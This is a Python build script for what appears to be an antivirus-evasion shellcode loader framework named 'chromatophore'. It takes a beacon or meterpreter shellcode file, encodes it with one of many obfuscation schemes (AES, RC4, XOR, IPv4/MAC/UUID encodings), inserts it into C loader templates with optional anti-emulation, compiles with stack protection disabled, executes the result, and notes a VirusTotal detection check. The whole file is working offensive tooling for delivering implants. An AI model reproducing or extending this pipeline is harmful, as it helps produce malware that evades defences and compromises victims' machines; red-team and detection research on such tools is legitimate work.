import subprocess
import os
import sys


from chromatophore.aes import aes
from chromatophore.bin2mac import bin2mac
from chromatophore.bin2ip import bin2ip
from chromatophore.jargon import jargon
from chromatophore.jigsaw import jigsaw
from chromatophore.base64 import base64
from chromatophore.base64api import base64api
from chromatophore.offset import offset
from chromatophore.rc4api import rc4api
from chromatophore.reverse_byte_order import reverse_byte_order
from chromatophore.xor_reverse import xor_reverse
from chromatophore.xor_single import xor_single
from chromatophore.xor_multibyte import xor_multibyte
from chromatophore.reverse_hex_string import reverse_hex_string
from chromatophore.twoarray import twoarray
from chromatophore.uuidapi import uuidapi
from chromatophore.caesar import caesar
from chromatophore.noobfuscation import noobfuscation

#import importlib
#def ImportChromatophore():
#    package = "chromatophere"
#
#    for name in module_names:
#        module = importlib.import_module(f"{package}.{name}")
#        func = getattr(module, name)
#        result = func()  # or func(some_arg)
#        print(f"{name}() => {result}")


function_map = {
    "noobfuscation": noobfuscation.noobfuscation,
    "aes": aes.aes,
    "base64": base64.base64,
    "base64api": base64api.base64api,
    "bin2ip": bin2ip.bin2ip,
    "bin2mac": bin2mac.bin2mac,
    "caesar": caesar.caesar,
    "jargon": jargon.jargon,
    "jigsaw": jigsaw.jigsaw,
    "offset": offset.offset,
    "rc4api": rc4api.rc4api,
    "reverse_byte_order": reverse_byte_order.reverse_byte_order,
    "reverse_hex_string": reverse_hex_string.reverse_hex_string,
    "twoarray": twoarray.twoarray,
    "uuidapi": uuidapi.uuidapi,
    "xor_reverse": xor_reverse.xor_reverse,
    "xor_single": xor_single.xor_single,
    "xor_multibyte": xor_multibyte.xor_multibyte,
}

    # no obfuscation
    # // compile: cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcnoobfuscation.c /link /out:noobfuscation.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

    # aes/
    # // python3 aes.py met.bin
    # // compile: cl.exe /nologo /Tcaes.c /link /out:aes.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # Requires either the pycryptodome or pycryptodomex package (`python3 -m pip install pycryptodomex`) 

    # bin2ip
    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2ipv4.c /link /OUT:bin2ipv4.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # bin2ip.py -i met.bin 
    # IPv4s = []
    
    # bin2mac
    # //  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2mac.c /link /OUT:bin2mac.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # python3 bin2mac.py -i met.bin

    # jargon
    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcjargon.c /link /out:jargon.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # jargon.py

    # jigsaw
    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcjigsaw.c /link /out:jigsaw.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # python3 jigsaw.py met.bin

    # offset
    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcoffset.c /link /out:offset.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # python3 offset.py -i met.bin

    # reverse_byte_order
    # compile: cl.exe /nologo /Tcreverse_byte_order.c /link /OUT:reverse_byte_order.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # // python3 reverse_byte_order.py

    # uuid
    # python3 bin2uuid.py -i met.bin
    # //  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcuuid.c /link /out:uuid.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

    # xor_single
    # //	cl.exe /nologo /MT /Tcxor.c /link /out:xor.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # python3 xor.py

    # xor_multibyte
    # //	cl.exe /nologo /Tcxor-multibyte-key.c /link /out:xor-multibyte-key.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    # // python3 xor.py


def do():
    # beacon.bin?
    # 
    # optional: create meterpreter shellcode
    #   - out: output/shellcode.bin
    #
    # execute bin2mac/bin2mac.py with shellcode.bin
    #   - out: shellcode_encoded
    # 
    # open bin2mac.c as template
    #   - //SHELLCODE_ENCODED// to shellcode_encoded
    #   - optional: add anti-emulation
    #   - out: output/bin2mac.c
    #
    # compile output/bin2mac.c
    #   - out: output/bin2mac.exe
    #
    # send to virustotal
    #   - in: output/bin2mac.exe
    #   - out: output/bin2mac.exe.json

    module = "noobfuscation"

    print("Templating")

    shellcode_file = "beacon.bin"
    mod_data = function_map[module](shellcode_file)

    print("Mod data: " + mod_data)

    template_input = "chromatophore\\{}\\{}.c".format(module, module)
    template_output = "chromatophore\\{}\\{}_work.c".format(module, module)

    convert_template(template_input, template_output, mod_data)
    compile_and_execute(module)
    

def convert_template(template_input, template_output, mod_data, anti_emulation_data=""):
    print("Convert template: {} -> {}".format(template_input, template_output))
    with open(template_input) as template_file:
        template = template_file.read()
        template = template.replace('{{ANTI_EMULATION}}', anti_emulation_data)
        template = template.replace('{{SHELLCODE}}', mod_data)
        
        with open(template_output, 'w') as output_file:
            output_file.write(template)


def compile_and_execute(module):
    module_c = "chromatophore\\{}\\{}_work.c".format(module, module)
    module_exe = "output\\{}.exe".format(module)

    print("Executing module: " + module)
    cmd = "cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tc{} /link /OUT:{} /SUBSYSTEM:CONSOLE /MACHINE:x64".format(
        module_c, module_exe
    )

    print("Compiling: {} into {}".format(module_c, module_exe))
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        print("Error executing command: " + cmd)
        sys.exit(1)

    print("Executing module: " + module)
    result = subprocess.run(module_exe, shell=True)


def main():
    do()


if __name__ == "__main__":
    main()
